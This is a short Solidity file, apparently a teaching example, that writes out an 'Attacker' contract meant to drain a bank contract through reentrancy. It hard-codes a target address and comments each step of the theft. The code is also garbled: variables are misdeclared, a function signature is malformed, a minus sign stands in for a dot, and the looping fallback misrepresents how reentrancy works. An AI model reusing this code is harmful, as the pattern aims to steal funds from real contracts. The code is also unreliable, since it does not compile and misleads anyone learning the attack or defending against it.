pragma solidity >= 0.7.0 < 0.9.0

contract Attacker {
    // address of bank to be attacked, which is vulnerable to reentrancy
    // please note that the address provided is not applicable and was found publicly online to serve as an example
    constructor() public {
        address address_bank = 0x737cC6f8E53c7d1E54f4063aF5bB8aB926AB51Ab; 
        uint256 ether_stolen = 0; 
    }

    /**
    * attack() function to abuse reentrancy has the following steps
    * 1. attacker deposits [10] ether into the Bank 
    * 2. then attacker, before the user_balance[msg.sender] = 0; expression is updated, forces the flow to go into a payable 
attacker_fallback() function
    * 3. the attacker_fallback() function will then call withdraw again, until funds of the bank are depleted. 
     */
    function attack(address_bank = 0x737cC6f8E53c7d1E54f4063aF5bB8aB926AB51Ab) {
        // step 1
        address_bank.deposit.value(10 ether)(); 
        // step 2
        address_bank-withdraw(); 
    }
    /** 
    * fallback function must have no name, no arguments
    */ 
    function () payable {
        // get the total bank balance of the Bank contract
        uint256 bank_balance = address_bank.balance(); 
        // ether_stolen increments by 10, so, to make sure that the transaction doesn't revert, due to Bank's insuficient balance, 
(ether_stolen + 10) is set
        while((ether_stolen + 10) <= bank_balance) {
            address_bank.withdraw(); 
            ether_stolen += 10; 
        }
    }
}
